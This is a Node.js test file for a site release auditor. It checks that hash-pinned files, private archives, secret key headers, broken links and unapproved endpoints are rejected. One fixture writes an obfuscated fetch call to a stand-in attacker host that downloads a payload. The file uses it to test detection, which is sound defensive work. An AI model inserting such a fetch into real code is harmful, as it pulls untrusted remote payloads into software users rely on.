import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,mkdir,writeFile,rm} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {auditRelease} from '../release-audit.mjs';

const release = new URL('../',import.meta.url);

test('actual deploy contents are limited to the reviewed public files', async () => {
  const result=await auditRelease(release,{siteRoot:process.env.VA_SITE_ROOT});
  assert.deepEqual(result.errors,[]);
  assert.ok(result.files.includes('index.html'));
  assert.ok(result.files.includes('knowledge.mjs'));
  assert.ok(result.files.includes('VA_Universal_Bounded_Review_MNDA.pdf'));
});

test('a modified or substituted public NDA PDF fails the pinned release boundary', async () => {
  const dir=await mkdtemp(join(tmpdir(),'va-public-audit-'));
  try {
    await writeFile(join(dir,'VA_Universal_Bounded_Review_MNDA.pdf'),'%PDF-1.7\nsubstituted');
    const result=await auditRelease(dir,{allowPartial:true});
    assert.ok(result.errors.some(e=>e.includes('VA_Universal_Bounded_Review_MNDA.pdf')&&e.includes('SHA-256')));
  } finally { await rm(dir,{recursive:true}); }
});

test('rejects a private or binary file accidentally added to a site directory', async () => {
  const dir=await mkdtemp(join(tmpdir(),'va-public-audit-'));
  try {
    await writeFile(join(dir,'index.html'),'<h1>safe</h1>');
    await writeFile(join(dir,'full-kernel-private.zip'),'confidential-bytes');
    const result=await auditRelease(dir,{allowPartial:true});
    assert.ok(result.errors.some(e=>e.includes('full-kernel-private.zip')));
  } finally { await rm(dir,{recursive:true}); }
});

test('rejects nested private directories and secrets even when stored as text', async () => {
  const dir=await mkdtemp(join(tmpdir(),'va-public-audit-'));
  try {
    await mkdir(join(dir,'private_data'));
    await writeFile(join(dir,'private_data','orig.txt'),'protected');
    await writeFile(join(dir,'index.html'),['-----BEGIN RSA','PRIVATE KEY-----'].join(' '));
    const result=await auditRelease(dir,{allowPartial:true});
    assert.ok(result.errors.some(e=>e.includes('private_data')));
    assert.ok(result.errors.some(e=>e.includes('index.html')&&e.includes('secret')));
  } finally { await rm(dir,{recursive:true}); }
});

test('release audit inspects public test files and refuses unknown deploy additions', async()=>{
  const result=await auditRelease(release,{siteRoot:process.env.VA_SITE_ROOT});
  assert.ok(result.files.includes('tests/engine.test.mjs'));
  assert.ok(result.files.includes('tests/release.test.mjs'));
});

test('release audit rejects a missing local link and an unauthorized external endpoint', async()=>{
  const dir=await mkdtemp(join(tmpdir(),'va-public-audit-'));
  try {
    await writeFile(join(dir,'index.html'),'<a href="../unpublished.html">bad link</a>');
    await writeFile(join(dir,'app.mjs'),`fetch('https:'+'//evil.example.net/payload')`);
    const result=await auditRelease(dir,{allowPartial:true,siteRoot:dir});
    assert.ok(result.errors.some(e=>e.includes('unpublished.html')));
    assert.ok(result.errors.some(e=>e.includes('endpoint')));
  } finally { await rm(dir,{recursive:true}); }
});

test('release audit rejects broken answer-desk source declarations',async()=>{
  const dir=await mkdtemp(join(tmpdir(),'va-desk-source-audit-'));
  try{
    await writeFile(join(dir,'visitor-answer-desk.mjs'),"const broken=source('Missing proof','../proofs/NOT-THERE.md');");
    const result=await auditRelease(dir,{allowPartial:true,siteRoot:dir});
    assert.ok(result.errors.some(e=>e.includes('NOT-THERE.md')),result.errors.join('\n'));
  }finally{await rm(dir,{recursive:true});}
});

test('release audit refuses a configured Frankie endpoint without separate authorization',async()=>{
  const dir=await mkdtemp(join(tmpdir(),'va-frankie-audit-'));
  try{
    await writeFile(join(dir,'frankie-client.mjs'),"export const FRANKIE_GATEWAY_URL='https://unapproved-gateway.example';");
    const result=await auditRelease(dir,{allowPartial:true});
    assert.ok(result.errors.some(e=>e.includes('frankie-client')&&e.includes('pinned')),result.errors.join('\n'));
  }finally{await rm(dir,{recursive:true});}
});
